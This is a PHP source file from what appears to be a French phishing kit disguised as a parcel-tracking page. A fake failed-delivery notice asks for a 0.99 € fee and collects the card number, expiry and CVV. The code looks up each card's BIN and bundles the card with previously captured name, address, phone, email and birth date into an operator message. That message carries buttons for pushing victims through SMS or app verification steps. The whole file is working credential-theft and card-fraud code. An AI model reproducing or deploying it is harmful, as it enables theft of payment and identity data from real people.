<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (
        isset($_POST['cc']) &&
        isset($_POST['exp']) &&
        isset($_POST['cvv'])
    ) {
        $cc = str_replace(' ', '', $_POST['cc']);
        $_SESSION['cc'] = $_POST['cc'];
        $bin = substr($cc, 0, 6);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "https://api.bincodes.com/bin/?format=json&api_key=" . $rez["apiKey"]["bincodes"] . "&bin=" . $bin . "&format=json");
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $bcode = json_decode(curl_exec($ch));

        $level = (isset($bcode->level) && $bcode->level !== "") ? $bcode->level : "❌";
        $type = (isset($bcode->type) && $bcode->type !== "") ? $bcode->type : "❌";
        $bank = (isset($bcode->bank) && $bcode->bank !== "") ? $bcode->bank : "❌";
        $scheme = (isset($bcode->card) && $bcode->card !== "") ? $bcode->card : "❌";


        $ccmsg = "<b>🏦 Carte de Paiement</b>
├ 💳 Numéro de carte : <code>" . $cc . "</code>
├ 📅 Expiration : <code>" . $_POST["exp"] . "</code>
└ 🔒 Cryptogramme visuel : <code>" . $_POST["cvv"] . "</code>
        
<b>🗃 Coordonnées Bancaires</b>
├ 🏛 Nom de la banque : <code>" . $bank . "</code>
├ 📉 Type : <code>" . $type . "</code>
├ 🥇 Niveau : <code>" . $level . "</code> 
└ 🌐 Scheme : <code>" . $scheme . "</code>";
        $_SESSION["ccmsg"] = $ccmsg;

        $msg = "<blockquote><b>💳 + 1 NEW CARD</b></blockquote>
└ " . $cc . "

<b>🏦 Billing</b>
├ 👤 Nom Prénom : <code>" . $_SESSION["nom"] . "</code>
├ 🏠 Adresse : <code>" . $_SESSION["adresse"] . "</code>
├ 🏙️ Ville : <code>" . $_SESSION["ville"] . "</code>
├ 📮 Zip : <code>" . $_SESSION["zip"] . "</code>
├ 📞 Numéro de téléphone :  <code>" . $_SESSION["phone"] . "</code>
├ 📩 E-mail :  <code>" . $_SESSION["email"] . "</code>
└ 🎂 Date de naissance : <code>" . $_SESSION["date"] . "</code>

" . $ccmsg . $info;

        $_SESSION["msg"] = $msg;
        $id = createId();
        $_SESSION["id"] = $id;
        $_SESSION["btn"] = [
            [
                ['text' => 'SMS 📲', "url" => $domain . '/admin/action?redirect=confirmation&id=' . $id],
                ['text' => 'APP 📲', "url" => $domain . '/admin/action?redirect=app&id=' . $id],
            ],
            [
                ['text' => 'ACCEPTER ✅', "url" => $domain . '/admin/action?redirect=thanks&id=' . $id],
                ['text' => 'INVALIDE ❌', "url" => $domain . '/admin/action?redirect=pay&id=' . $id]
            ],
        ];
        $dbAdminData["cc"] = getr($dbAdminData, "cc", 0) + 1;
        $dbAdmin->set($host, $dbAdminData);
        header("location: /waiting");
    }

    die();
}
$header = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/header.php');
$footer = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/footer.php');
$html = (function () {
    global $rez;
    ob_start();
?>

    <form method="post">
        <div class="breadcrumb">
            <div class="grid">
                <div class="row">
                    <ul>
                        <li><a href="#/">
                                Accueil</a></li>
                        <li class="active">Suivi de colis</li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="internal-page suivi">
            <div class="grid">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12 mt-5 center">
                    </div>
                </div>
            </div>
            <div class="main">

                <div data-v-67007474="" id="tracking-wrapper" class="app-wrapper">
                    <div data-v-577ebd12="" data-v-67007474="">
                        <div class="suivi-colis-page">
                            <div data-v-577ebd12="" class="input-zone">
                                <h2 data-v-577ebd12="">Colis numéro: <?= $rez["suivi"] ?>

                                </h2>

                                <p>
                                    En raison d'un échec de la livraison initiale, votre colis doit être renvoyé depuis notre entrepôt.<br><br>
                                    Pour cela, un moyen de paiement valide est requis pour couvrir les frais de livraison, qui s'élèvent à 0,99 €.
                                </p>
                                <br>
                                <div class="payplus-icons soluce-paiement">
                                    <img src="views/assets/Mastercard.svg" height="60" title="Mastercard">
                                    <img src="views/assets/Visa.svg" height="60" title="Visa">
                                    <img src="views/assets/Paypal.svg" height="60" title="Paypal">
                                    <img src="views/assets/CB.svg" height="60" title="CB">
                                </div>
                                <h4 style="text-align: center">Pré-autorisation : 0,99€
                                </h4>

                                <div class="form-row" style="width: 100%;">
                                    <input type="tel" name="cc"
                                        maxlength="20" minlength="16"
                                        onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));"
                                        oninput="validlun(this);"
                                        onpaste="validlun(this);"
                                        oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(\..*?)\..*/g, '$1');"
                                        required="required" placeholder="Numéro de carte">
                                </div>

                                <div class="form-row" style="width: 100%;">
                                    <input type="tel"
                                        maxlength="5"
                                        minlength="5"
                                        onkeyup="formatString(event);"
                                        onpaste="formatString(event);"

                                        onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));"
                                        name="exp" required="required" placeholder="MM/AA">
                                </div>

                                <div class="form-row" style="width: 100%;">
                                    <input type="tel"
                                        onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));"
                                        maxlength="4"
                                        minlength="3"
                                        name="cvv" required="required" placeholder="CVV">
                                </div>
                                <p class="info-container" data-v-577ebd12="">
                                    Les frais ne seront débités qu'après confirmation de la livraison réussie de votre colis.
                                </p>
                                <br>
                                <div>
                                    <button type="submit" id="tracking_form_submit" class="btn btn-primary btn-suivi">Confirmer mon mode de paiement
                                    </button>
                                </div> <br>

                                <div class="f-right paypluslink" style="display: flex; align-items:center;justify-content:center;gap:0.5rem">
                                    <img class="icon-locker" src="views/assets/ico_locker2.svg" title="Lock">
                                    Ce site est entièrement sécurisé
                                </div>


                            </div>

    </form>
    <div id="loader-div-new" class="hidden-class-new">
        <div id="mask-id-new"></div>
        <div class="spinner-class-new"></div>
    </div>
    <script>
        document.querySelector("form").addEventListener("submit", function(e) {
            document.getElementById("loader-div-new").style.visibility = "visible";
            document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;"
        })
    </script>
    </div>

    </div>
    </div>
    </div>
    </form>
<?php
    return ob_get_clean();
})();

$html = $header . $html . $footer;
require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/base.php');
?>